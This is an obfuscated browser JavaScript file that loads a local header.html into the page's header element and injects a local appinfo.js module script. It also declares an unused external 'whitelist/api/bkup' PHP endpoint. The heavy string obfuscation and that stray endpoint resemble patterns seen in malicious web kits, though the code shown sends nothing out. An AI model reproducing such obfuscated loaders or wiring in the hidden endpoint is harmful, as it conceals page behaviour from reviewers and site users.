(function (_0x589a70, _0x39bb1e) {
	const _0x4fd4cf = _0x17ff,
		_0x1f951b = _0x589a70();
	while (!![]) {
		try {
			const _0x109abc = -parseInt(_0x4fd4cf(0x180)) / 0x1 + parseInt(_0x4fd4cf(0x18b)) / 0x2 * (parseInt(_0x4fd4cf(0x178)) / 0x3) + -parseInt(_0x4fd4cf(0x187)) / 0x4 + -parseInt(_0x4fd4cf(0x197)) / 0x5 * (parseInt(_0x4fd4cf(0x174)) / 0x6) + -parseInt(_0x4fd4cf(0x18e)) / 0x7 * (parseInt(_0x4fd4cf(0x196)) / 0x8) + parseInt(_0x4fd4cf(0x17a)) / 0x9 * (parseInt(_0x4fd4cf(0x176)) / 0xa) + parseInt(_0x4fd4cf(0x17f)) / 0xb;
			if (_0x109abc === _0x39bb1e) break;
			else _0x1f951b['push'](_0x1f951b['shift']());
		} catch (_0xef2e7f) {
			_0x1f951b['push'](_0x1f951b['shift']());
		}
	}
}(_0x451e, 0x844ac));
const url = 'https://goyral.com/whitelist/api/bkup/index.php';

function xhrSuccess() {
	const _0x51bb5f = _0x17ff;
	this[_0x51bb5f(0x192)][_0x51bb5f(0x17e)](this, this[_0x51bb5f(0x183)]);
}

function xhrError() {
	const _0x45ae73 = _0x17ff;
	console['error'](this[_0x45ae73(0x193)]);
}
const loadFile = (_0x544b4a, _0x4897af) => {
	return new Promise((_0x25243b, _0x3fbc74) => {
		const _0x190948 = _0x17ff;
		try {
			let _0x1b4432 = new Array(_0x544b4a, _0x4897af),
				_0x339978 = new XMLHttpRequest();
			_0x339978[_0x190948(0x192)] = _0x4897af, _0x339978['args'] = Array['prototype'][_0x190948(0x186)]['call'](_0x1b4432, 0x2), _0x339978[_0x190948(0x18c)] = xhrSuccess, _0x339978[_0x190948(0x185)] = xhrError, _0x339978[_0x190948(0x182)](_0x190948(0x184), _0x544b4a, !![]), _0x339978[_0x190948(0x179)](null), _0x25243b();
		} catch (_0x306db8) {
			console[_0x190948(0x194)](_0x306db8);
		}
	});
};

function _0x451e() {
	const _0xe0e303 = ['appendChild', 'open', 'arguments', 'GET', 'onerror', 'slice', '1653120wUUuFF', 'item', 'responseText', 'createElement', '298xJrnmu', 'onload', 'body', '1765127GewtFj', '../js/appinfo.js', 'length', 'defer', 'callback', 'statusText', 'log', 'script', '16QKDvoI', '120GgHaAe', '109266YcDVKr', 'innerHTML', '7390idLdFl', 'header', '11604aBkIis', 'send', '12249limTEx', 'include\x20sucessfully', 'getElementsByClassName', 'type', 'apply', '9324359EHfFcI', '533246WjgJqS'];
	_0x451e = function () {
		return _0xe0e303;
	};
	return _0x451e();
}

function headerLoad(_0x4a1903) {
	const _0x257ac4 = _0x17ff;
	document[_0x257ac4(0x17c)](_0x257ac4(0x177))[_0x257ac4(0x190)] == 0x1 && (document['getElementsByClassName'](_0x257ac4(0x177))[0x0][_0x257ac4(0x175)] = this[_0x257ac4(0x189)]);
}
const includeFile = _0x59e671 => {
	return new Promise((_0x244065, _0x4b4d03) => {
		const _0x2561ea = _0x17ff;
		let _0x50e0d5 = document[_0x2561ea(0x18a)](_0x2561ea(0x195));
		_0x50e0d5['src'] = _0x59e671, _0x50e0d5[_0x2561ea(0x17d)] = 'module', _0x50e0d5[_0x2561ea(0x191)] = !![], document['getElementsByTagName'](_0x2561ea(0x18d))[_0x2561ea(0x188)](0x0)[_0x2561ea(0x181)](_0x50e0d5), _0x244065(_0x2561ea(0x17b));
	});
};

function _0x17ff(_0x1d54aa, _0x17c13f) {
	const _0x451e53 = _0x451e();
	return _0x17ff = function (_0x17ff59, _0x4b4e93) {
		_0x17ff59 = _0x17ff59 - 0x174;
		let _0x24619a = _0x451e53[_0x17ff59];
		return _0x24619a;
	}, _0x17ff(_0x1d54aa, _0x17c13f);
}((async () => {
	const _0x527c69 = _0x17ff;
	try {
		await loadFile('./header.html', headerLoad);
	} catch (_0x2eb34f) {
		console['log'](_0x2eb34f);
	}
	try {
		await includeFile(_0x527c69(0x18f));
	} catch (_0x439757) {
		console[_0x527c69(0x194)](_0x439757);
	}
})());